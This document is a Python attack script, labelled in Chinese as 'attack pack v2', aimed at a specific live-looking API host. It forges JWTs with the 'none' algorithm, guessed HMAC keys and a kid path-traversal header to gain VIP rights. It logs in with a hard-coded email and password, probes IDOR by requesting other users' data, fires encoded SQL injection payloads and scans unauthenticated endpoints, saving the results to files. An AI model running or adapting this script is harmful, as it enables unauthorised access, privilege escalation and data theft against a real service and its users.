# -*- coding: utf-8 -*-
"""攻击包 v2: JWT 算法混淆 + IDOR 越权 + 二次注入/编码绕过"""

import urllib.request, urllib.parse, json, time, sys, ssl, base64, hmac, hashlib

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
out = []


def log(s):
    print(s, flush=True)
    out.append(str(s))


def req(method, path, data=None, headers=None, timeout=12):
    h = {
        "User-Agent": UA,
        "Origin": "https://loiship.com",
        "Referer": "https://loiship.com/",
    }
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(
        "https://api.moegoat.com" + path, data=body, headers=h, method=method
    )
    ctx = ssl.create_default_context()
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:200]
    except Exception as e:
        return "EXC", type(e).__name__


shard = int(sys.argv[1]) if len(sys.argv) > 1 else 1
res = []


def b64u(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def make_jwt(alg, payload, key=None):
    h = {"alg": alg, "typ": "JWT"}
    p1 = b64u(json.dumps(h, separators=(",", ":")).encode())
    p2 = b64u(json.dumps(payload, separators=(",", ":")).encode())
    if alg == "none":
        return p1 + "." + p2 + "."
    if key:
        sig = hmac.new(key.encode(), (p1 + "." + p2).encode(), hashlib.sha256).digest()
        return p1 + "." + p2 + "." + b64u(sig)
    return p1 + "." + p2 + ".x"


# 1. JWT 算法混淆攻击
log("=== JWT 攻击 ===")
vip_payload = {
    "sub": 686285,
    "role": "user",
    "vip_id": 4,
    "vip_level": 4,
    "svip": 1,
    "expiry_at": "2099-01-01 00:00:00",
}
keys = [
    "secret",
    "loivip.com",
    "moegoat",
    "loibus",
    "123456",
    "password",
    "loibus-sec-decoy-salt-v1",
    "loibus-web-request-id-v1",
    "loiship",
    "sk-4fugxKBcZcnHptd6LJrJcBaRQv8UXwBLXW7diPie6tVuMb5PbU4LZF2lQxIIPkG7",
]
jwts = [("none", make_jwt("none", vip_payload))]
for k in keys:
    jwts.append(("HS256:" + k[:12], make_jwt("HS256", vip_payload, k)))
# kid 注入
jwts.append(
    (
        "kid-path",
        b64u(b'{"alg":"HS256","typ":"JWT","kid":"../../../../etc/passwd"}')
        + "."
        + b64u(json.dumps(vip_payload).encode())
        + ".x",
    )
)
jwts.append(
    (
        "kid-null",
        b64u(b'{"alg":"HS256","typ":"JWT","kid":null}')
        + "."
        + b64u(json.dumps(vip_payload).encode())
        + ".x",
    )
)
for name, t in jwts:
    st, b = req(
        "GET",
        "/api/user/loi/online_play_v2/6422",
        headers={"Authorization": "Bearer " + t},
    )
    res.append({"t": "jwt-" + name, "s": st, "b": b[:200]})
    log("jwt %s: %s %s" % (name, st, b[:80].replace("\n", " ")))
    time.sleep(0.4)

# 2. IDOR 越权
log("=== IDOR ===")
st, body = req(
    "POST", "/api/user/login", {"email": "3124323585@qq.com", "password": "9876543210."}
)
tok = ""
if st == 200:
    tok = (json.loads(body).get("access_token") or "").replace("bearer ", "")
H = {"Authorization": "Bearer " + tok}
time.sleep(1)
idor_tests = [
    ("GET", "/api/user/info?user_id=1", H),
    ("GET", "/api/user/info?user_id=2", H),
    ("GET", "/api/user/mydownloaded?user_id=1", H),
    ("GET", "/api/user/mydownloaded?user_id=2", H),
    ("GET", "/api/user/mylikes?user_id=1", H),
    ("GET", "/api/user/notifications?user_id=1", H),
    ("GET", "/api/comment/1?page=1", H),
    ("GET", "/api/comment/2?page=1", H),
    ("GET", "/api/user/loi/download_v6/6422?user_id=1", H),
    ("GET", "/api/user/subscribed/list?user_id=1", H),
]
for method, path, hdrs in idor_tests:
    st, b = req(method, path, headers=hdrs)
    res.append({"t": "idor-" + path, "s": st, "b": b[:250]})
    log("idor %s: %s %s" % (path[:50], st, b[:90].replace("\n", " ")))
    time.sleep(0.4)

# 3. 二次注入/编码绕过
log("=== 编码注入 ===")
enc_tests = [
    ("/api/lois/6422%2527", "double-quote"),
    ("/api/lois/%36%34%32%32", "hex"),
    ("/api/lois/6422%00", "null"),
    ("/api/lois/6422%20OR%201=1", "space-or"),
    ("/api/lois/6422%09", "tab"),
    ("/api/lois?page=%31%27", "enc-page-quote"),
    (
        "/api/lois?page=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "union-null",
    ),
    ("/api/lois?page=1%20AND%20(SELECT%201%20FROM%20users%20LIMIT%201)=1", "subquery"),
    ("/api/lois?sort=IF(1=1,id,title)", "func-inject"),
    ("/api/lois?sort=json_extract(1,1)", "json-func"),
    ("/api/lois?page=1&order=id%20DESC%20LIMIT%201", "order-limit"),
]
for path, name in enc_tests:
    st, b = req("GET", path, headers=H)
    res.append({"t": "enc-" + name, "s": st, "b": b[:250]})
    log("enc %s: %s %s" % (name, st, b[:80].replace("\n", " ")))
    time.sleep(0.4)

# 4. 未鉴权端点扫描
log("=== 匿名端点 ===")
anon_tests = [
    ("GET", "/api/lois/6422"),
    ("GET", "/api/sp_list"),
    ("GET", "/api/comment/6422?page=1"),
    ("GET", "/api/lois?page=1&sort=new"),
    ("GET", "/api/user/info"),
    ("GET", "/api/tags"),
    ("GET", "/api/categories"),
    ("GET", "/api/site-info"),
    ("GET", "/api/config"),
]
for method, path in anon_tests:
    st, b = req(method, path)
    res.append({"t": "anon-" + path, "s": st, "b": b[:250]})
    log("anon %s: %s %s" % (path[:45], st, b[:80].replace("\n", " ")))
    time.sleep(0.4)

with open("sqli2_%d.jsonl" % shard, "w", encoding="utf-8") as f:
    for r in res:
        f.write(json.dumps(r, ensure_ascii=False) + "\n")
with open("sqli2_%d.txt" % shard, "w", encoding="utf-8") as f:
    f.write("\n".join(out))
log("v2 shard%d done" % shard)
